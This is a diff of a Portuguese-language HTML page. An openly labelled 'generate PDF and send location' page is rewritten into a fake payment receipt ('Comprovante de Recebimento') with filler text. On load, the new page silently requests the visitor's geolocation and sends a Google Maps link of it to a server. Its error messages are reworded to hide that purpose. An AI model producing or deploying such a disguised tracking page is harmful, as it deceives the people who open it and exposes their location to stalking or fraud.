@@ -2,57 +2,50 @@
 <html lang="pt-BR">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Gerar PDF com Localização</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 2rem;
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 8px;
-      background-color: royalblue;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: darkblue;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
 
 <body>
-  <h1>Gerador de PDF</h1>
-  <p>Clique no botão abaixo para gerar um PDF com um texto aleatório e enviar sua localização.</p>
-  <button onclick="gerarPDF()">Gerar PDF e Enviar Localização</button>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p>A tecnologia tem desempenhado um papel fundamental na transformação da sociedade moderna, influenciando desde a maneira como nos comunicamos até a forma como trabalhamos, aprendemos e nos relacionamos com o mundo. O avanço constante de áreas como inteligência artificial, internet das coisas, computação em nuvem e automação tem permitido o desenvolvimento de soluções inovadoras que otimizam processos, aumentam a produtividade e melhoram a qualidade de vida. Na educação, por exemplo, plataformas digitais tornaram o ensino mais acessível; na saúde, tecnologias de diagnóstico e tratamento estão salvando vidas. À medida que novas descobertas surgem, a tecnologia continua sendo uma força propulsora de mudanças, moldando o futuro com possibilidades antes inimagináveis.</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
 
   <script>
-    async function gerarPDF() {
-      const textoAleatorio = "Este é um texto aleatório para teste de geração de PDF via JavaScript no navegador.";
-
-      // Gerar PDF com jsPDF
-      const { jsPDF } = window.jspdf;
-      const doc = new jsPDF();
-      doc.text(textoAleatorio, 10, 20);
-      doc.save("texto-aleatorio.pdf");
-
-      // Obter e enviar localização
+    window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(enviarLocalizacao, handleError);
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Seu navegador não suporta geolocalização.");
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
-    }
+    });
 
-    function enviarLocalizacao(position) {
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -66,19 +59,17 @@
       })
         .then(response => response.json())
         .then(data => {
-          if (data.success) {
-            console.log("Localização enviada com sucesso!");
-          } else {
-            alert("Erro ao enviar localização.");
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
           }
         })
         .catch(error => {
-          console.error("Erro ao enviar localização:", error);
+          console.error("Erro:", error);
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter localização: " + error.message);
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
